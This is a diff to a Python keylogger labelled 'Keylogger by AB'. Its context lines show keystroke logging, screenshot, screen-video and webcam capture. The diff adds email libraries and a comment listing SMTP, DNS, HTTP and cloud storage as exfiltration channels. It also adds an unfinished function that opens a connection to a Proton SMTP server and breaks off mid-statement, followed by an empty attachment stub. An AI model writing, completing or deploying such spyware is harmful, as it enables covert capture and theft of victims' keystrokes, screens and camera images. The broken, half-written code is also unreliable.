@@ -1,4 +1,4 @@
-
+#!/usr/bin/python3
 # built in modules 
 import sys
 import os
@@ -6,16 +6,28 @@ import subprocess
 import ctypes
 import socket
 import time
+from datetime import datetime
 import logging
 import shutil
 import platform # we can use here platform.system() or os.name 
 from threading import Thread
 from multiprocessing import Process
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+
 
 # external libaries 
 from pynput.keyboard import Listener
 from PIL import ImageGrab
 import cv2 
+import cryptography
+
+
+
+
 
 
 
@@ -25,8 +37,12 @@ def initialize_logging(global_path):
     
     Args:
         global_path (str): The directory where log files will be stored.
+        
     """
-    log_file = os.path.join(global_path, 'logs.txt') 
+    today_date = datetime.today().strftime('%Y-%m-%d')
+    log_file_name = f'logs_{today_date}.log'
+
+    log_file = os.path.join(global_path, log_file_name) 
     logging.basicConfig(filename=log_file, level=logging.INFO,
                         format='%(asctime)s - %(levelname)s - %(message)s')
     logging.info("Keylogger by AB started.")
@@ -34,10 +50,10 @@ def initialize_logging(global_path):
 def capture_keystroke(keys_logs_path):
     """
     Captures keystrokes and logs them to the specified file.
-    
     Args:
         keys_logs_path (str): File path where keystrokes will be logged.
     """
+
     def on_press(key):
         try:
             with open(keys_logs_path, 'a') as log_file:
@@ -107,6 +123,42 @@ def capture_screenvideos(path):
 
 
 
+
+
+
+
+# Exfiltration technique: SMTP, DNS, HTTP, Cloud Storage, 
+#TODO: do not test 
+
+
+def email_handle(password,email_address ):
+
+    try :
+        with smtplib.SMTP('smtp.proton.com') as proton_smtp:
+            proton_smtp.session
+
+
+
+
+def email_attachemnt():
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 # main function 
 def main(): 
     """
@@ -124,8 +176,8 @@ def main():
     
     keys = os.path.join(global_path, 'keys.txt')
     screenshots_path = os.path.join(global_path, 'screenshots')
-    screenvideos_path = os.path.join(global_path, 'screenvideos')
     webcam_path = os.path.join(global_path, 'webcam')
+    screenvideos_path = os.path.join(global_path, 'screenvideos')
 
     for path in [screenshots_path, screenvideos_path, webcam_path]:
         if not os.path.exists(path):
